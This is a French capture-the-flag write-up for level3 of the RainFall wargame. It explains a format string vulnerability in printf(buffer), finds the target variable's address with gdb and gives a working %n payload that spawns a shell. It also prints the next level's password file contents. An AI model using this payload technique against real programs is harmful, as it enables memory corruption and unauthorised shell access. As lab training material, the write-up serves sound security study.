## Analyse du code source :

Code source simplifié

```c
// Variable globale non initialisée
int m;

// Fonction principale du programme
int v(void)
{
    char buffer[520];  // Buffer de 520 octets (512 + marge)
    
    // Lit l'entrée utilisateur (max 512 caractères)
    fgets(buffer, 512, stdin);
    
    // VULNÉRABILITÉ: Format string - utilise directement buffer comme format
    // Permet d'écrire dans la mémoire via des spécificateurs de format (%n, etc.)
    printf(buffer);
    
    // Vérifie si la variable globale m a été modifiée pour valoir 64
    if (m == 64)
    {
        fwrite("Wait what?!\n", 1, 12, stdout);
        return system("/bin/sh");  // Ouvre un shell si m == 64
    }
    
    return m;
}
```

Après analyse du code source, on observe que le programme utilise fgets(520) sur un buffer[512] et ensuite passe ce buffer à printf.
L'utilisation de printf de cette manière constitue une vulnérabilité

```
Un code tel que printf(foo); indique souvent un bug, car foo peut contenir un caractère %. Si foo provient d'une entrée utilisateur non fiable, il peut contenir %n, ce qui permet à printf() d'écrire en mémoire et crée une faille de sécurité.
```

En utilisant cette vulnérabilité, nous pouvons modifier arbitrairement la variable globale à la valeur souhaitée pour lancer le shell. Pour ce faire, il suffit de fournir une chaîne de format adéquate qui écrira la valeur voulue à l'adresse de cette variable.


## 1 - Récupérer l'adresse de la variable m :

```shell
level3@RainFall:~$ gdb ./level3
[...]
(gdb) info variables
[...]
0x0804988c  m
(gdb) 
```

## 2 - Identifier la position de notre input

En ajoutant des identifiants `%p` à notre chaîne, nous pouvons repérer la position de notre entrée utilisateur dans la pile. Dans notre cas, la valeur AAAA apparaît en 4ᵉ position car AAAA correspond à 41414141 en hexadécimal.

```
level3@RainFall:~$ ./level3
AAAA %p %p %p %p %p %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```

## 3 - Exploiter la vulnérabilité 

`(python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60c%4$n"'; cat) | ./level3`

- On commence par écrire l’adresse de la variable, ce qui occupe déjà 4 octets. 
- Ensuite, on utilise `%60c` pour ajouter 60 espaces (padding), ce qui donne une chaîne de 64 caractères au total. 
- Il ne reste plus qu’à écrire le nombre de caractères imprimés à ce stade (avec %n) à l’adresse fournie en 4ème argument (soit l’adresse de la variable à modifier), grâce à `%4$n`.

```
level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60c%4$n"'; cat) | ./level3
?                                                           
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

`(python -c 'print "\x08\x04\x98\x8c"[::-1] + "%p %p %p %p"'; cat) | ./level3`
